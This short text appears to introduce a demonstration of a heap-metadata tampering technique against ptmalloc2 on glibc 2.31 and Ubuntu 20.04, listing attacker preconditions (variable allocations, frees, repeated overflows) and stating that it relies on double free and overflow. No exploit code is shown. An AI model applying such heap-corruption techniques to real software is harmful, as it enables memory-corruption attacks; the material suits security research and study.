This is a demonstration of a novel method for tampering with heap meta-data in ptmalloc2.
It has been tested on GLibc 2.31, Ubuntu 20.04. In terms of exploitation the requirements are as follows:

- Attacker can allocate chunks of variable sizes.
- Attacker can free chunks.
- Attacker can overflow chunks multiple times.

This is purely double free and overflow. There is no use-after-free necessary. 
Note that it may in some cases also be possible to overflow the forward pointer of the next chunk, leading to an effect like a use-after-free.
